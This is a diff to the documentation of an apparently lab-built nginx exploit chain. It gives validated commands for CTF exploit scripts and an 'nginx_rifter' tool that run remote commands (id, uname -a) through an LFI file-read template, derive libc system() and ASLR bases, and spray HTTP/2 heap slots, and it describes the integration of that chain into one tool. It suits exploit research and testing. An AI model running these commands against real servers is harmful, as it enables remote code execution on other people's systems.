@@ -31,7 +31,7 @@ Validated command:
 
 ```bash
 ./demo_ctf_exploit_v1_1.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --artifact-dir artifacts
 ```
 
@@ -68,7 +68,7 @@ Validated command:
 
 ```bash
 ./demo_ctf_exploit_v1_2.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --require-reset-core \
   --artifact-dir artifacts
 ```
@@ -104,7 +104,7 @@ Validated command:
 
 ```bash
 ./demo_ctf_exploit_v1_3.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --require-reset-core \
   --artifact-dir artifacts
 ```
@@ -136,7 +136,7 @@ Validated command:
 
 ```bash
 ./demo_ctf_exploit_v1_4.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --require-reset-core \
   --artifact-dir artifacts
 ```
@@ -168,7 +168,7 @@ Validated command:
 
 ```bash
 ./demo_ctf_exploit_v1_5.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --require-reset-core \
   --rounds 2 --artifact-dir artifacts
 ```
@@ -205,7 +205,7 @@ Validated negative-path command:
 
 ```bash
 ./demo_ctf_exploit_v1_6.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --require-reset-core \
   --negative-test bad-candidate --negative-test-only --expected-fail \
   --no-binary-fingerprint --artifact-dir artifacts
@@ -223,7 +223,7 @@ Validated command-exec/fingerprint command:
 
 ```bash
 ./demo_ctf_exploit_v1_6.py \
-  --host 192.168.1.205 --port 19321 \
+  --host <target-host> --port 19321 \
   --fast --no-color --require-reset-core --rounds 2 \
   --exec-cmd id --cleanup-delay 30 --cleanup-core \
   --artifact-dir artifacts
@@ -267,7 +267,7 @@ Validated compact command:
 
 ```bash
 ./demo_ctf_exploit_v1_8.py \
-  --host 192.168.1.205 --cmd 'id; uname -a; seq 1 20' \
+  --host <target-host> --cmd 'id; uname -a; seq 1 20' \
   --fast --artifact-dir artifacts
 ```
 
@@ -289,7 +289,7 @@ Validated template-backed file-read command:
 
 ```bash
 ./demo_ctf_exploit_v1_8.py \
-  --host 192.168.1.205 --cmd id --fast --rounds 1 \
+  --host <target-host> --cmd id --fast --rounds 1 \
   --artifact-dir artifacts \
   --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}'
 ```
@@ -320,7 +320,7 @@ Validated command:
 
 ```bash
 ./demo_ctf_exploit_v1_9.py \
-  --host 192.168.1.205:19321 --cmd 'ls -la /app/tmp' \
+  --host <target-host>:19321 --cmd 'ls -la /app/tmp' \
   --fast --artifact-dir artifacts --phpinfo-path ''
 ```
 
@@ -349,14 +349,14 @@ Validated `HOST:PORT` command:
 
 ```bash
 ./demo_ctf_exploit_v1_9.py \
-  --host 192.168.1.205:19321 --cmd id \
+  --host <target-host>:19321 --cmd id \
   --fast --rounds 1 --artifact-dir artifacts --phpinfo-path ''
 ```
 
 Observed result:
 
 ```text
-Target: 192.168.1.205:19321
+Target: <target-host>:19321
 PHP version: not learned
 [04] Remote command verification setup
 winning address: 0x55e4210b2127
@@ -377,12 +377,12 @@ Status: pass.
 - Discovers nginx worker maps and derives libc `system()` when the file-read permissions allow it.
 - Discovers nginx config paths from master cmdline plus common paths and detects vulnerable `rewrite` + `set` candidates.
 - Produces a viability matrix for the current core-guided chain.
-- Keeps exploit execution behind explicit `--exploit --cmd ...`, handing off to `demo_ctf_exploit_v1_9.py`.
+- Keeps exploit execution behind explicit `--exploit --cmd ...`. Older v2 builds handed off to `demo_ctf_exploit_v1_9.py`; the current build integrates the exploit path directly.
 
 Validated assessment:
 
 ```bash
-./nginx_rifter.py --target 192.168.1.205:19321 \
+./nginx_rifter.py --target <target-host>:19321 \
   --artifact-dir artifacts --no-color \
   --output artifacts/nginx_rifter_20260515-v2-final.json
 ```
@@ -401,16 +401,16 @@ verdict: ready-with-lab-like-core-leak
 Validated custom file-read template:
 
 ```bash
-./nginx_rifter.py --target 192.168.1.205:19321 \
+./nginx_rifter.py --target <target-host>:19321 \
   --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}' \
   --artifact-dir artifacts --no-color \
   --output artifacts/nginx_rifter_20260515-v2-template.json
 ```
 
-Validated explicit exploit handoff:
+Validated explicit exploit mode:
 
 ```bash
-./nginx_rifter.py --target 192.168.1.205:19321 \
+./nginx_rifter.py --target <target-host>:19321 \
   --artifact-dir artifacts --no-color \
   --exploit --cmd id --fast --exploit-rounds 1 --phpinfo-path ''
 ```
@@ -422,18 +422,38 @@ Status: pass.
 For video recording:
 
 ```bash
-./demo_ctf_exploit_v1_9.py --host 192.168.1.205:19321 --cmd id --clear
+./demo_ctf_exploit_v1_9.py --host <target-host>:19321 --cmd id --clear
 ```
 
 For a fast validation run:
 
 ```bash
-./demo_ctf_exploit_v1_9.py --host 192.168.1.205:19321 --cmd id --fast
+./demo_ctf_exploit_v1_9.py --host <target-host>:19321 --cmd id --fast
 ```
 
 ## Remaining Technical Limits
 
 - This still depends on readable crash cores as the strong memory-disclosure primitive.
+
+## nginx_rifter Self-Contained Refactor
+
+The current `nginx_rifter.py` no longer imports `demo_ctf_exploit_v1_9.py`, `ctf_remote_exploit.py`, or `poc.py`, and no longer shells out to an older runner for `--exploit`.
+
+Changes:
+
+- Inlined the HTTP file-read adapter, including template-backed LFI/download vectors.
+- Inlined nginx worker discovery, same-UID `/proc/<pid>/maps` parsing, remote libc `system()` derivation, ELF build-ID extraction, binary hashing, and version-string scanning.
+- Inlined HTTP/2 probing plus the spray/trigger/core slot scanner needed by the integrated exploit path.
+- Replaced the older split-runner exploit path with `Integrated Exploit Path`.
+- Added `--derive-only` to validate exploit-side ASLR/libc derivation without sending crash probes.
+- Moved low-level geometry/core tuning options behind `--advanced-help` so default `--help` remains focused.
+
+Docker verification:
+
+- Assessment passed against `127.0.0.1:19321`.
+- Custom `--file-read-template` passed against the same Docker route.
+- `--exploit --derive-only --cmd id` passed and wrote exploit derivation metadata into the JSON artifact.
+- A bounded one-candidate exploit smoke produced a worker crash, parsed core program headers, and exercised slot/pool scanning. It was not expected to win because the Docker runtime is only a regression target here and the scan was intentionally capped.
 - The same-port lab intentionally uses one nginx worker for reproducibility. Multiple production workers would require worker selection or more retry logic.
 - The exploit is calibrated for the current lab nginx build, Ubuntu userspace, and HTTP/2 connection-pool layout.
 - The chain is stronger than a hardcoded-offset demo because ASLR-sensitive bases and final heap candidates are derived remotely, but it remains a lab chain rather than a claim about default production exploitability.
